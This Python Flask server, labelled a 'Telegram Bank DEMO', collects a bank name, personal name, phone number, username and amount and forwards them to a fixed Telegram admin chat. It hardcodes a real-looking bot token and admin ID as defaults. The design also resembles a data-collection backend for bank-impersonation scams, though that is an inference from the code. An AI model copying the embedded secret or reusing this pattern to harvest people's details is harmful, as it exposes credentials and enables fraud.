import os
import requests

from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("Bot_token", "8571545356:AAGtqHYmafuPxJbQn00ipb2PxtXlKHi40Rw")
ADMIN_ID = os.environ.get("ADMIN_ID", "6306406299")


@app.route("/")
def home():
    return "Telegram Bank DEMO server is running"


@app.route("/submit", methods=["POST"])
def submit():

    data = request.get_json(silent=True)

    if not data:
        return jsonify({
            "ok": False,
            "error": "Invalid JSON"
        }), 400

    bank = str(data.get("bank", "")).strip()
    name = str(data.get("name", "")).strip()
    phone = str(data.get("phone", "")).strip()
    username = str(data.get("username", "")).strip()
    amount = str(data.get("amount", "")).strip()

    if not all([bank, name, phone, username, amount]):
        return jsonify({
            "ok": False,
            "error": "Барлық жолды толтырыңыз"
        }), 400

    message = (
        "🔔 DEMO ӨТІНІМ\n\n"
        f"🏦 Банк: {bank}\n"
        f"👤 Аты: {name}\n"
        f"📱 Телефон: {phone}\n"
        f"🔗 Username: {username}\n"
        f"💰 Сома: {amount} ₸"
    )

    try:

        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_ID,
                "text": message
            },
            timeout=15
        )

        if not r.ok:
            return jsonify({
                "ok": False,
                "error": "Telegram API error"
            }), 500

    except requests.RequestException:
        return jsonify({
            "ok": False,
            "error": "Telegram connection error"
        }), 500

    return jsonify({
        "ok": True
    })


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 8080))
          )
